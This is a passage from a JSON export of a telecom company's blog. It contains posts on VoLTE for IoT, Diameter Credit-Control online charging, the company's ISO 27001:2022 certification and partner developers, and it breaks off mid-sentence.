src={require(\\"!file-loader!./cars-beach-image.jpg\\").default}\\n  />\\n\\nTelenor manages international IoT deployments for global customers in some 200 countries and today operates more than 20 million connected devices to enterprises such as Volvo, Scania, Hitachi, Verisure Securitas Direct and Husqvarna. WG2 has been selected to provide the VoLTE technology to Telenor Connexion\u2019s subscribers, wherever in the world they have 4G network coverage only.\\n\\nThe gradual shutdown of legacy 2G/3G networks across the world makes VoLTE mandatory to provide voice services for critical use cases such as assistance calls for smart elevators, elderly monitoring, and car emergency/helpline calls.\\n\\nWG2\u2019s VoLTE-as-a-service has been integrated with Telenor Connexion\u2019s internal systems, as well as to relevant service partners platforms including the Aeris IoTA (Internet of Things Accelerator), to jointly operate for subscriber network access, authentication, and services profile. It has also been integrated to handle calls outside VoLTE domain (legacy mobile circuit switching / public switched telephone network). VoLTE from WG2 is built on IMS (IP Multimedia Subsystem) infrastructure, which enables voice and messaging over IP.\\n\\nVoLTE-as-a-service provides benefits such as reduced infrastructure investment, rapid deployment, scalability, expertise and support, continuous upgrades and innovation, geographic reach, interconnectivity, and cost optimization. \\n\\n\u201cFor us, the scalability of VoLTE is of high essence. With a cloud-based solution delivered to us as a service we find that WG2 can fulfil our global scalability needs, while also complying to our high expectations of security and availability,\u201d says Martin Whitlock, CTO, Telenor Connexion.\\n\\n\u201cAs networks rapidly evolve, so must critical voice infrastructure. We\u2019re pleased to work with Telenor Connexion, the leading, global IoT vendor, to provide their customers with scalable and secure voice capabilities, delivered as-a-service,\u201d says Erlend Prestgard, CEO, WG2.\\n\\n#### About Working Group Two\\n\\nWorking Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency \u2013 leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Our mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. Read more at https://wgtwo.com\\n\\n---\\n\\n##### Contact details\\n\\nTor Odland<br />\\nHead of Marketing, WG2<br />\\ntor@wgtwo.com<br />\\n+47 9909 0872"},{"id":"the-worst-message-in-telco","metadata":{"permalink":"/blog/the-worst-message-in-telco","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2023-05-17-the-worst-message-in-telecom/index.mdx","source":"@site/../blog/2023-05-17-the-worst-message-in-telecom/index.mdx","title":"The worst message in telecom (you won\'t believe)","description":"Sorry for the click-bait title, I couldn\'t resist.","date":"2023-05-17T00:00:00.000Z","formattedDate":"May 17, 2023","tags":[{"label":"telco","permalink":"/blog/tags/telco"},{"label":"diameter","permalink":"/blog/tags/diameter"},{"label":"credit-control","permalink":"/blog/tags/credit-control"},{"label":"charging","permalink":"/blog/tags/charging"}],"readingTime":10.54,"hasTruncateMarker":true,"authors":[{"name":"Sebastian Weddmark Olsson","title":"Tech Lead for Session Management & Protocol Termination","url":"https://www.linkedin.com/in/sebastian-weddmark-olsson/","imageURL":"/img/author-photos/swo.jpg","key":"seba"}],"frontMatter":{"slug":"the-worst-message-in-telco","title":"The worst message in telecom (you won\'t believe)","image":"./pengar_i_telefontornet.png","tags":["telco","diameter","credit-control","charging"],"authors":["seba"]},"prevItem":{"title":"WG2 to deliver voice over 4G (VoLTE) for IoT solutions","permalink":"/blog/wg2-volte-for-iot"},"nextItem":{"title":"Achieving ISO 27001:2022 Certification: What You Need to Know","permalink":"/blog/iso27001"}},"content":"Sorry for the click-bait title, I couldn\'t resist.\\n\\nIn this blog post I will describe online charging and go in depth on\\nthe Credit-Control message, what it is used for, what it contains, and\\nwhere it is sent.\\n\\n\x3c!--truncate--\x3e\\n\\n## What is charging?\\n\\nIf you (as a user of telephone services, aka subscriber) want to make a\\nphone call, send SMS or use data services, then your operator wants to\\nknow that you are able to pay for that action. This is called\\ncharging, the method of collecting and checking the number of used\\nservice units.\\n\\nThere is also the concept of billing that often goes hand in hand:\\nInvoicing you for those charged services units.\\n\\nThere are multiple plans which you can have, for instance you might\\nhave a prepaid SIM-card where you top up your saldo in advance, or you\\nmight have a subscription plan which allows for some services for a\\nfixed price.\\n\\nThe operators might handle the user\'s session with regards to charging\\nin two ways. Either they are using offline charging, or an online\\ncharging system.\\n\\nOffline charging cannot affect user sessions in real time, it\\ncalculates the charging records after the session is finished and updates\\nthe user\'s values. For instance you might get the invoice after the\\nmonth finishes with the cost of your usage.  In order to send the\\ninvoice, the operator need to collect records of the user\'s usage,\\nthese records are called Charging Detail Records, and acronymed CDRs.\\nThe CDRs are sent from all the parts of the network that handles the\\nuser\'s session. For instance the SMSGW node is collecting CDRs for\\nSMS-usage, a PGW for Data-usage, etc.\\n\\nThe other way is to have a online charging setup, where all the telco\\nnodes need to ask for credits at the moment the user is using the\\nservices. The system that gets the request is called an Online\\nCharging System, or OCS in telco-lingo, and resides at the operator\\ncontrol.  It is called online charging because it can actively affect\\nthe user session in real time, i.e. block or allow user actions based\\non the values and calculations in the OCS. The different systems sends\\na request toward the OCS asking for some action, e.g. SMSGW might ask\\nthe OCS if the user has credits enough to send a message.\\n\\nBasically the OCS is a database storing information about prices of\\nthe operators services, as well as keeping track of the user\'s credits.\\n\\nThe pricing is based per operator and could go for example something\\nlike this\\n\\n- 100 free SMSes, after that 1 SEK per SMS\\n- 60 free voice minutes, then 5:50 SEK per minute\\n- 1 GB free data transfered per week\\n\\nAll operators have different pricing models in order to compete with\\neach other, not one model fits all etc. Therefore the OCS node has a\\nlot of configuration parameters it can set. For instance if a\\nsubscriber uses up all available data, should she be directed to a\\ntop-up page to buy more data, or should the data usage be blocked or\\nrate-limited, and if she doesn\'t use up all data, should the remaining\\ndata be added to a future pot, available only next period or until\\nused up?\\n\\n![The OCS in the network](ocs-in-network.svg)\\n\\nThis picture shows how you the subscriber and the OCS are located in\\nthe network. Your phone connects to the antennas of the visiting\\nnetwork. The visiting network is the network that owns the antennas\\nand spectrums, aka mobile network operator or MNO. In Sweden, it is one\\nof Telia, Tele2, Telenor, or Tre. In Germany it is Telekom, O2, or\\nVodafone. Wikipedia has\\n[lists](https://en.wikipedia.org/wiki/List_of_mobile_network_operators#By_region)\\nif you want to check your country\'s MNOs.\\n\\nWhen using one of the services provided, a bunch of requests are sent\\nfrom the visiting network to your home network, i.e. your operators\\nnetwork. This network *could* be the same network as the visiting\\nnetwork, but it doesn\'t have to. For instance if you have a Telenor\\nSIM-card, you could be in Telenors network if you are in Sweden, but\\nyou could be in Telekoms network roaming if in Germany, or you could\\nhave a Vimla SIM-card, which is an Swedish MVNO (virtual operator;\\nmeaning they don\'t have their own licence for the radio bands, but\\nthey have an agreement with Telenor to use their network.). It gets\\ncomplicated quickly and I\'ve only mentioned the visiting and home\\nnetwork (there are others, e.g. interrogating network).\\n\\nBetween the networks there are nodes called Signal Transfer Point\\n(STP) or Diameter Relay Agents (DRA), depending on which technology\\nyou use. Their purpose are to connect between networks and route\\nmessages between nodes. You can think of it as routers with advance\\nfunctionality for some specific protocols. I\'m not going to go into\\nthis much deeper, but I\'ll do mention some of the interfaces. I\'ll\\nstart with the CAMEL interface (more specifically between the gsmSCF\\n[GSM Service Control Function] and gsmSSF [GSM Service Switching\\nFunction]).\\n\\nCAMEL (Customized Applications for Mobile networks Enhanced Logic)\\nmake it possible for a home network to receive updates of it\'s users\\nactions. As an example, when you start a call, the visiting network\\nwill use CAMEL to send an InitialDP (user has entered a detection\\npoint) message to the home network. The home network will then respond\\nwith either Continue or Connect (if it accept the action) which lets\\nthe user and visiting network to continue to set up the call, or the\\nhome network can send a ReleaseCall message which denies the call to\\nbe set up (or disconnects if the call is already set up).\\n\\nIn our setup (as in Working Group Two setup), the OCS is managed by a\\nthird party, a partner with us and our customer, and so there are DRAs\\nconnecting the third party network with our network as well.\\n\\nThe home network will apply online charging by sending\\nCredit-Control-Request messages to the OCS, which will lookup the\\nsubscriber and the subscribers credits, and set the corresponding\\npricing.\\n\\n## What is the problem?\\n\\nDisclaimer: These are all my personal thoughts, and there are probably\\nreasons the interface and messages are designed the way they are, that\\nI yet don\'t grasp.\\n\\nIn my opinion there are too many different usages and definitions for\\nthe Credit-Control message, it is to general and reused in too many\\ndifferent cases.\\n\\nFirst out is the network interfaces. An interface is the definition of\\nhow nodes talk to each other. It usually specifies which nodes are\\ninvolved, and which messages are allowed.  For instance the Ro\\ninterface contains Credit-Control messages for SMS, MMS and voice\\ncalls, between the IP Multimedia Subsystem (IMS) and the OCS.  There\\nis also the Gy interface between the Packet Gateway (PGW) and the OCS,\\nwhich also carries Credit-Control messages for data usage. As well as\\nthe Gx interface which carries Credit-Control messages for... policy\\ncontrol between PGW and the Policy and charging rules function (PCRF)\\nto create service session level policy decisions.\\n\\n![Different OCS interfaces](ocs-interfaces.svg)\\n\\n| Interface | Application-ID | Description                                | Nodes involved                    |\\n|-----------|----------------|--------------------------------------------|-----------------------------------|\\n| Base      | 4              | Diameter Credit-Control Application        | Any: Credit-Control Client/Server |\\n| Ro        | 4              | Online charging for SMS, MMS, voice calls  | IMS (CSCF), OCS                   |\\n| Gy        | 4              | Online charging for data services          | PGW (PCEF), OCS                   |\\n| Gx        | 16777238       | Policy control for data and voice services | PGW (PCEF), PCRF                  |\\n\\nSo even if we only focus on application for online charging, i.e. with\\nApplication-ID set to 4, then we have the specifications for the\\nCredit-Control message.  There are multiple specifications, the base\\nDiameter defined in RFC4006, which can be used for any Diameter\\napplication which would want to have online charging functions, as\\nwell as the 3GPP (Telco) defined in TS 32.299, for how online charging\\nshould work in telecommunication applications like the ones above.\\n3GPP TS 32.299 is actually split up into multiple specifications\\ndepending on which service or context used, each defines a number of\\n\\"allowed fields\\" from TS 32.299 for the context.\\n\\nE.g.\\n3GPP TS 32.251 for PS charging,\\n3GPP TS 32.253 for CPDT charging,\\n3GPP TS 32.254 for Exposure function API charging,\\n3GPP TS 32.260 for IMS charging,\\n3GPP TS 32.270 for MMS service charging,\\n3GPP TS 32.271 for LCS service charging,\\n3GPP TS 32.272 for PoC service charging,\\n3GPP TS 32.273 for MBMS service charging,\\n3GPP TS 32.274 for SMS service charging,\\n3GPP TS 32.275 for MMTel service charging,\\n3GPP TS 32.276 for VCS charging,\\n3GPP TS 32.277 for ProSe charging,\\n3GPP TS 32.278 for Monitoring Event charging,\\n3GPP TS 32.280 for AoC Service Information, and\\n3GPP TS 32.296 for ABMF Rc information\\n\\nThe Diameter base specification for credit-control RFC4006, and the\\nTelecom online charging specification 3GPP TS 32.299 specifications\\nare similar but different, let us compare the top fields in the\\n`Request` messages in Diameter dictionary form:\\n\\nimport styles from \'./index.module.css\';\\n\\n<div className={styles.ccravps}>\\n\\n| Base Credit-Control-Request           | 3GPP TS 32.299 Credit-Control-Request |\\n|---------------------------------------|---------------------------------------|\\n| < Diameter Header: 272, REQ, PXY >    | < Diameter Header: 272, REQ, PXY >    |\\n| < Session-Id >                        | < Session-Id >                        |\\n| { Origin-Host }                       | { Origin-Host }                       |\\n| { Origin-Realm }                      | { Origin-Realm }                      |\\n| { Destination-Realm }                 | { Destination-Realm }                 |\\n| { Auth-Application-Id }               | { Auth-Application-Id }               |\\n| { Service-Context-Id }                | { Service-Context-Id }                |\\n| { CC-Request-Type }                   | { CC-Request-Type }                   |\\n| { CC-Request-Number }                 | { CC-Request-Number }                 |\\n| [ Destination-Host ]                  | [ Destination-Host ]                  |\\n| [ User-Name ]                         | [ User-Name ]                         |\\n| [ CC-Sub-Session-Id ]                 |                                       |\\n| [ Acct-Multi-Session-Id ]             |                                       |\\n| [ Origin-State-Id ]                   | [ Origin-State-Id ]                   |\\n| [ Event-Timestamp ]                   | [ Event-Timestamp ]                   |\\n| *[ Subscription-Id ]                  | *[ Subscription-Id ]                  |\\n| [ Service-Identifier ]                |                                       |\\n| [ Termination-Cause ]                 | [ Termination-Cause ]                 |\\n| [ Requested-Service-Unit ]            |                                       |\\n| [ Requested-Action ]                  | [ Requested-Action ]                  |\\n|                                       | [ AoC-Request-Type ]                  |\\n| *[ Used-Service-Unit ]                |                                       |\\n| [ Multiple-Services-Indicator ]       | [ Multiple-Services-Indicator ]       |\\n| *[ Multiple-Services-Credit-Control ] | *[ Multiple-Services-Credit-Control ] |\\n| *[ Service-Parameter-Info ]           |                                       |\\n| [ CC-Correlation-Id ]                 | [ CC-Correlation-Id ]                 |\\n| [ User-Equipment-Info ]               | [ User-Equipment-Info ]               |\\n|                                       | [ OC-Supported-Features ]             |\\n| *[ Proxy-Info ]                       | *[ Proxy-Info ]                       |\\n| *[ Route-Record ]                     | *[ Route-Record ]                     |\\n|                                       | [ Service-Information ]               |\\n| *[ AVP ]                              | *[ AVP ]                              |\\n\\n</div>\\n\\nA quick guide on how to read this:\\n\\n- `< AVP >` indicates a mandatory Attribute-Value Pair with a fixed position in the message.\\n- `{ AVP }` indicates a mandatory Attribute-Value Pair in the message.\\n- `[ AVP ]` indicates an optional Attribute-Value Pair in the message.\\n- `*AVP` indicates that multiple occurrences of an Attribute-Value Pair is possible.\\n\\nEach [Attribute-Value\\nPairs](https://en.wikipedia.org/wiki/Name%E2%80%93value_pair) contain\\ninformation over each field in the message, and they can contain deep\\nstructure with multiple (grouped) fields.\\n\\nThe last field named `*[ AVP ]` actually means that the message can\\ncontain other arbitrary AVPs that are not mentioned, defined by the sender.\\n\\nTo comment on this, the messages are similar, but not compatible with\\neach other. The same goes for the comparison of the\\nsub-specifications, e.g. 3GPP TS 32.260 for IP multimedia subsystem\\n(IMS) charging, and 3GPP TS 32.276 for Voice Call Services (VCS)\\ncharging; they are similar but not compatible.\\n\\nWe\'ve just scratched the surface of these messages and applications,\\nbut I\'m already tired.\\n\\n\\n## Summary\\n\\nOnline charging as a concept is great to have in the portfolio, I\\nbelieve. My concern is that some of the telco protocols seem to be\\nhave written by the same people behind the AUTOSAR specification.\\nAmbiguous, hard to understand, too many fields and different\\ninterfaces, and vendors that does different things on top of it to get\\ntheir things to work...\\n\\n(Sorry for being harsh to the people designing this, it\'s probably not\\nthat easy).\\n\\nThe issue is that this interface is not expected to be an interconnect\\ninterface, meaning the operator owns the OCS system and can decide to\\nsend whatever works internal in their own network for their own use\\ncases.\\n\\nWhat I would\'ve liked is to split the messages and applications. 3GPP\\nonline charging to get a separate application-id from base diameter\\ncredit-control. Deprecation of TS 32.299 in favor of the context-based\\nspecifications. It is too much things that happen in the current\\nprotocol, specifications and messages."},{"id":"iso27001","metadata":{"permalink":"/blog/iso27001","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2023-05-02-iso27001/index.md","source":"@site/../blog/2023-05-02-iso27001/index.md","title":"Achieving ISO 27001:2022 Certification: What You Need to Know","description":"In today\'s digital age, cybersecurity is an ever-increasing concern for organizations worldwide. It\'s imperative to keep sensitive information safe from cybercriminals - especially as a telecom mobile core network. That\'s why we\'re thrilled to announce that Working Group Two has achieved the ISO 27001:2022 certification - a globally recognized standard for information security management systems. This latest accomplishment marks a significant milestone for our organization in ensuring the security of our telco core network and edge sites, protecting our customers\' confidential data from any potential threats.","date":"2023-05-02T00:00:00.000Z","formattedDate":"May 2, 2023","tags":[{"label":"security","permalink":"/blog/tags/security"}],"readingTime":5.99,"hasTruncateMarker":true,"authors":[{"name":"Jonny Griffin","title":"Security Tech Lead","url":"https://www.linkedin.com/in/jonnathangriffin/","imageURL":"/img/author-photos/jg.jpg","key":"jonny-griffin"}],"frontMatter":{"slug":"iso27001","title":"Achieving ISO 27001:2022 Certification: What You Need to Know","tags":["security"],"authors":["jonny-griffin"],"image":"./iso-badge-background.png"},"prevItem":{"title":"The worst message in telecom (you won\'t believe)","permalink":"/blog/the-worst-message-in-telco"},"nextItem":{"title":"Meet the trailblazing product developers that help mobile operators differentiate and innovate - on WG2\'s platform","permalink":"/blog/trailblazing-product-devs"}},"content":"import Image from \\"@theme/IdealImage\\";\\nimport styles from \\"./styles.css\\";\\nimport Tooltip from \'../components/tooltip/tooltip\'\\n\\nIn today\'s digital age, cybersecurity is an ever-increasing concern for organizations worldwide. It\'s imperative to keep sensitive information safe from cybercriminals - especially as a telecom mobile core network. That\'s why we\'re thrilled to announce that Working Group Two has achieved the ISO 27001:2022 certification - a globally recognized standard for information security management systems. This latest accomplishment marks a significant milestone for our organization in ensuring the security of our telco core network and edge sites, protecting our customers\' confidential data from any potential threats.\\n\\n\x3c!--truncate--\x3e\\n\\nReceiving the [ISO 27001:2022 certification](https://www.iafcertsearch.org/certified-entity/b173f6b7-3418-5050-875b-e513ecaece42) offers Working Group Two a host of benefits that are critical in today\'s rapidly evolving digital landscape. Firstly, it provides a robust framework to manage and protect sensitive information from any potential security threats. Secondly, it ensures the implementation of security controls to safeguard against cyber-attacks, data breaches, and other security incidents. Thirdly, it instills trust and confidence in our customers that we take data security seriously and have implemented the necessary measures to protect their information. Ultimately, achieving this certification demonstrates our unwavering commitment to information security and reinforces our position as a reliable and trustworthy partner to our clients.\\n\\n:::tip ISO 27001:2022 Scope Statement\\nWorking Group Two operates a mobile core network platform-as-a-service, enabling its customers to provide mobile telecom services using its core network. In addition, WG2 builds APIs to drive the programmability of the mobile core network. The scope of the ISO/IEC 27001:2022 certification is limited to the Information Security Management System (ISMS) supporting Working Group Two AS\u2019s Software-as-a-Service (SaaS), Web application products, mobile telecom services in accordance with the Statement of Applicability version 1.0 dated 03/09/2023.\\n:::\\n\\n## ISO 27001:2022\\n\\n![iso badge](./iso-badge-background.png)\\n\\nISO 27001 released a new standard in 2022, succeeding their previous version from 2013, making it the newest and most comprehensive security standard that outlines [93 information security controls](https://docs.google.com/spreadsheets/d/1MpdbcFEmW5678L1SToJhf0UiC3mjcpSMStxbc_kDCxY/edit#gid=0) to safeguard against various risks and threats. These controls cover all aspects of information security, from policies and roles to the use of cryptography and network security. They address critical domains such as access control, authentication, secure coding, application security, vulnerability management, and incident management, to name a few. The standard also emphasizes the importance of compliance with legal, statutory, regulatory, and contractual requirements, ensuring that organizations maintain an up-to-date understanding of their obligations. By adhering to these controls, Working Group Two can significantly reduce its exposure to security risks and safeguard its sensitive data and assets against unauthorized access, theft, or misuse.\\n\\n<details>\\n  <summary><b>ISO 27001:2022 Controls</b></summary>\\n  <div>\\n<table><tr><th>#</th><td>ID</td><td>Name</td></tr><tr><th>1</th><td>5.1</td><td>Policies for information security</td></tr><tr><th>2</th><td>5.2</td><td>Information security roles and responsibilities</td></tr><tr><th>3</th><td>5.3</td><td>Segregation of duties</td></tr><tr><th>4</th><td>5.4</td><td>Management responsibilities</td></tr><tr><th>5</th><td>5.5</td><td>Contact with authorities</td></tr><tr><th>6</th><td>5.6</td><td>Contact with special interest groups</td></tr><tr><th>7</th><td>5.7</td><td>Threat intelligence</td></tr><tr><th>8</th><td>5.8</td><td>Information security in project management</td></tr><tr><th>9</th><td>5.9</td><td>Inventory of information and other associated assets</td></tr><tr><th>10</th><td>5.10</td><td>Acceptable use of information and other associated assets</td></tr><tr><th>11</th><td>5.11</td><td>Return of assets</td></tr><tr><th>12</th><td>5.12</td><td>Classification of information</td></tr><tr><th>13</th><td>5.13</td><td>Labelling of information</td></tr><tr><th>14</th><td>5.14</td><td>Information transfer</td></tr><tr><th>15</th><td>5.15</td><td>Access control</td></tr><tr><th>16</th><td>5.16</td><td>Identity management</td></tr><tr><th>17</th><td>5.17</td><td>Authentication information</td></tr><tr><th>18</th><td>5.18</td><td>Access rights</td></tr><tr><th>19</th><td>5.19</td><td>Information security in supplier relationships</td></tr><tr><th>20</th><td>5.20</td><td>Addressing information security within supplier agreements</td></tr><tr><th>21</th><td>5.21</td><td>Managing information security  in the ICT supply chain</td></tr><tr><th>22</th><td>5.22</td><td>Monitoring. review and change management of supplier services</td></tr><tr><th>23</th><td>5.23</td><td>Information security for use of cloud services</td></tr><tr><th>24</th><td>5.24</td><td>Information security incident management planning and preparation</td></tr><tr><th>25</th><td>5.25</td><td>Assessment and decision on information security events</td></tr><tr><th>26</th><td>5.26</td><td>Response to information security incidents</td></tr><tr><th>27</th><td>5.27</td><td>Learning from information security incidents</td></tr><tr><th>28</th><td>5.28</td><td>Collection of evidence</td></tr><tr><th>29</th><td>5.29</td><td>Information security during disruption</td></tr><tr><th>30</th><td>5.30</td><td>ICT readiness for business continuity</td></tr><tr><th>31</th><td>5.31</td><td>Legal, statutory, regulatory and contractual requirements</td></tr><tr><th>32</th><td>5.32</td><td>Intellectual property rights</td></tr><tr><th>33</th><td>5.33</td><td>Protection of records</td></tr><tr><th>34</th><td>5.34</td><td>Privacy and protection of PII</td></tr><tr><th>35</th><td>5.35</td><td>Independent review of information security</td></tr><tr><th>36</th><td>5.36</td><td>Compliance with policies. rules and standards for information security</td></tr><tr><th>37</th><td>5.37</td><td>Documented operating procedures</td></tr><tr><th>38</th><td>6.1</td><td>Screening</td></tr><tr><th>39</th><td>6.2</td><td>Terms and conditions of employment</td></tr><tr><th>40</th><td>6.3</td><td>Information security awareness. education and training</td></tr><tr><th>41</th><td>6.4</td><td>Disciplinary process</td></tr><tr><th>42</th><td>6.5</td><td>Responsibilities after termination or change of employment</td></tr><tr><th>43</th><td>6.6</td><td>Confidentiality or non-disclosure agreements</td></tr><tr><th>44</th><td>6.7</td><td>Remote working</td></tr><tr><th>45</th><td>6.8</td><td>Information security event reporting</td></tr><tr><th>46</th><td>7.1</td><td>Physical security perimeters</td></tr><tr><th>47</th><td>7.2</td><td>Physical entry</td></tr><tr><th>48</th><td>7.3</td><td>Securing offices. rooms and facilities</td></tr><tr><th>49</th><td>7.4</td><td>Physical security monitoring</td></tr><tr><th>50</th><td>7.5</td><td>Protecting against physical and environmental threats</td></tr><tr><th>51</th><td>7.6</td><td>Working in secure areas</td></tr><tr><th>52</th><td>7.7</td><td>Clear desk and clear screen</td></tr><tr><th>53</th><td>7.8</td><td>Equipment siting and protection</td></tr><tr><th>54</th><td>7.9</td><td>Security of assets off-premises</td></tr><tr><th>55</th><td>7.10</td><td>Storage media</td></tr><tr><th>56</th><td>7.11</td><td>Supporting utilities</td></tr><tr><th>57</th><td>7.12</td><td>Cabling security</td></tr><tr><th>58</th><td>7.13</td><td>Equipment maintenance</td></tr><tr><th>59</th><td>7.14</td><td>Secure disposal or re-use of equipment</td></tr><tr><th>60</th><td>8.1</td><td>User endpoint devices</td></tr><tr><th>61</th><td>8.2</td><td>Privileged access rights</td></tr><tr><th>62</th><td>8.3</td><td>Information access restriction</td></tr><tr><th>63</th><td>8.4</td><td>Access to source code</td></tr><tr><th>64</th><td>8.5</td><td>Secure authentication</td></tr><tr><th>65</th><td>8.6</td><td>Capacity management</td></tr><tr><th>66</th><td>8.7</td><td>Protection against malware</td></tr><tr><th>67</th><td>8.8</td><td>Management of technical vulnerabilities</td></tr><tr><th>68</th><td>8.9</td><td>Configuration management</td></tr><tr><th>69</th><td>8.10</td><td>Information deletion</td></tr><tr><th>70</th><td>8.11</td><td>Data masking</td></tr><tr><th>71</th><td>8.12</td><td>Data leakage prevention</td></tr><tr><th>72</th><td>8.13</td><td>Information backup</td></tr><tr><th>73</th><td>8.14</td><td>Redundancy of information processing facilities</td></tr><tr><th>74</th><td>8.15</td><td>Logging</td></tr><tr><th>75</th><td>8.16</td><td>Monitoring activities</td></tr><tr><th>76</th><td>8.17</td><td>Clock synchronization</td></tr><tr><th>77</th><td>8.18</td><td>Use of privileged utility programs</td></tr><tr><th>78</th><td>8.19</td><td>Installation of software on operational systems</td></tr><tr><th>79</th><td>8.20</td><td>Networks security</td></tr><tr><th>80</th><td>8.21</td><td>Security of network services</td></tr><tr><th>81</th><td>8.22</td><td>Segregation of networks</td></tr><tr><th>82</th><td>8.23</td><td>Web filtering</td></tr><tr><th>83</th><td>8.24</td><td>Use of cryptography</td></tr><tr><th>84</th><td>8.25</td><td>Secure development life cycle</td></tr><tr><th>85</th><td>8.26</td><td>Application security requirements</td></tr><tr><th>86</th><td>8.27</td><td>Secure system architecture and engineering principles</td></tr><tr><th>87</th><td>8.28</td><td>Secure coding</td></tr><tr><th>88</th><td>8.29</td><td>Security testing in development and acceptance</td></tr><tr><th>89</th><td>8.30</td><td>Outsourced development</td></tr><tr><th>90</th><td>8.31</td><td>Separation of development. test and production environments</td></tr><tr><th>91</th><td>8.32</td><td>Change management</td></tr><tr><th>92</th><td>8.33</td><td>Test information</td></tr><tr><th>93</th><td>8.34</td><td>Protection of information systems during audit testing</td></tr></table>\\n  </div>\\n</details>\\n\\n## Leveraging automation\\n\\nWorking Group Two recognized the need for efficient and effective compliance validation of cloud and edge resources to meet the ISO 27001:2022 standard. The team leveraged automation and the DevSecOps methodology to automate the validation process to achieve this goal. Through automation, the team was able to efficiently validate the compliance of these resources and reduce the potential for human error. The DevSecOps methodology ensured that security was integrated throughout the development and operational processes, resulting in more secure and compliant cloud and edge resources. The combination of automation and DevSecOps allowed Working Group Two to streamline its compliance validation process and ensure that its resources met the ISO 27001:2022 standard.\\n\\n## Responsible Disclosure Program\\n\\nImplementing a [responsible disclosure program](/security/responsible-disclosure/) has been a crucial part in this process, prioritizing wgtwos security of all systems and data. By establishing a clear and easy-to-use reporting mechanism for security vulnerabilities, we can now work with security researchers and other external parties to quickly identify and address potential threats. A successful responsible disclosure program not only helps us to stay ahead of potential security incidents, but also demonstrates our commitment to transparency and collaboration in the broader security community.\\n\\n## Our security speaks for itself\\n\\n[trust.wgtwo.com](https://trust.wgtwo.com) is a comprehensive platform designed to provide customers and partners with easy access to information about Working Group Two\'s security controls and certifications. The platform offers a centralized location to access detailed security documentation and certifications, including ISO 27001:2022 compliance, which assures customers that Working Group Two has implemented comprehensive security controls to protect their data and infrastructure. Additionally, trust promotes transparency and trust between Working Group Two and its customers by enabling easy access to relevant security information. With this platform, customers can have a better understanding of the security measures Working Group Two has put in place to protect their information and ensure its privacy. Overall, trust serves as an essential resource for customers and partners who want to stay informed and up-to-date on Working Group Two\'s security measures and certifications.\\n\\n<div align=\\"center\\"><a href=\\"https://trust.wgtwo.com\\" target=\\"_blank\\">https://trust.wgtwo.com</a></div>  \\n\\n![trust.wgtwo.com security dashboard](trust.wgtwo.com.png)\\n\\n## We have joined the elite 0.056% of European Companies\\n\\n:::note Only 0.056% European Companies are ISO 27001 Certified  \\n[22,112,982](https://www.statista.com/statistics/1248775/number-of-businesses-eu/) EU Companies  \\n[12,532](https://www.itgovernance.co.uk/blog/iso-27001-certification-figures-increase-by-20#:~:text=In%202016%2C%2033%2C290%20certifications%20were,certified%20to%20the%20Standard%20respectively.) EU Companies with ISO 27001  \\n:::\\n\\nNow, in May 2023 we are [officially ISO 27001:2022 certified](https://www.iafcertsearch.org/certified-entity/b173f6b7-3418-5050-875b-e513ecaece42)! The journey to reach this milestone was definitely challenging but also a rewarding experience. This accomplishment would not be possible without the support of many individuals across the organization - big \ud83d\udc4f\\n\\nWith the high ISO standard, we innovated a security posture via automating the validation of cloud and edge resources. Through our trust.wgtwo.com platform, we have established transparency with our customers and provided them with the ability to download certifications and security documentation. \\n\\nWe are proud that Working Group Two, as one of a few, can display our ISO 27001:2022 certification today, demonstrating to our customers that security is at the forefront of how Working Group Two operates, and is the backbone of our core network."},{"id":"trailblazing-product-devs","metadata":{"permalink":"/blog/trailblazing-product-devs","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2023-04-17-trailblazing-product-developers/index.md","source":"@site/../blog/2023-04-17-trailblazing-product-developers/index.md","title":"Meet the trailblazing product developers that help mobile operators differentiate and innovate - on WG2\'s platform","description":"Trailblazing product developers like OnRelay, ElitNet, Voxist and more help mobile operators differentiate and innovate on WG2\'s platform. Keep reading to find out how.","date":"2023-04-17T00:00:00.000Z","formattedDate":"April 17, 2023","tags":[{"label":"innovation","permalink":"/blog/tags/innovation"},{"label":"mobile-operators","permalink":"/blog/tags/mobile-operators"},{"label":"developers","permalink":"/blog/tags/developers"},{"label":"onrelay","permalink":"/blog/tags/onrelay"},{"label":"elitnet","permalink":"/blog/tags/elitnet"},{"label":"voxist","permalink":"/blog/tags/voxist"},{"label":"vxt","permalink":"/blog/tags/vxt"},{"label":"truecaller","permalink":"/blog/tags/truecaller"}],"readingTime":2.44,"hasTruncateMarker":true,"authors":[{"name":"Everyone @ wgtwo","title":"\ud83c\udf55","url":"https://www.wgtwo.com","imageURL":"/img/author-photos/wgtwo.png","key":"wgtwo"}],"frontMatter":{"slug":"trailblazing-product-devs","title":"Meet the trailblazing product developers that help mobile operators differentiate and innovate - on WG2\'s platform","date":"2023-04-17T00:00:00.000Z","tags":["innovation","mobile-operators","developers","onrelay","elitnet","voxist","vxt","truecaller"],"authors":["wgtwo"],"image":"./trailblazing-product-devs-cover.jpg"},"prevItem":{"title":"Achieving ISO 27001:2022 Certification: What You Need to Know","permalink":"/blog/iso27001"},"nextItem":{"title":"Tuning flux","permalink":"/blog/tuning-flux"}},"content":"import ImgWithCaption from \'../components/imgWithCaption\'\\n\\nTrailblazing product developers like OnRelay, ElitNet, Voxist and more help mobile operators differentiate and innovate on WG2\'s platform. Keep reading to find out how.\\n\\n\x3c!-- truncate --\x3e\\n\\n### **OnRelay - mobile switchboard**\\n\\nOnRelay\xa0is building a world-class, software-based\xa0**PBX**\xa0(mobile switchboard), available to all operators on WG2\'s platform. In\xa0[this video](https://www.youtube.com/watch?v=WYrVzKNpntQ), Marie Wold talks about who their dream customer is, and more.\xa0\\n\\n[![OnRelay talks about their PBX on WG2\'s platform](./video-thumbnail.png)](https://www.youtube.com/watch?v=WYrVzKNpntQ)\\n\\n### **ElitNet - voice anti-spam**\\n\\nFake calls and voice spam are a major nuisance for both operators and their customers. The clever folks at\xa0[Elitnet](https://elitnet.eu/), a product company with more than 25 years of experience, have created a product to protect the network and its subscribers from unwanted calls.\xa0**Voice Anti-spam**\xa0is available to operators on the WG2 platform.\xa0\\n\\n[Wanna build a product or see our 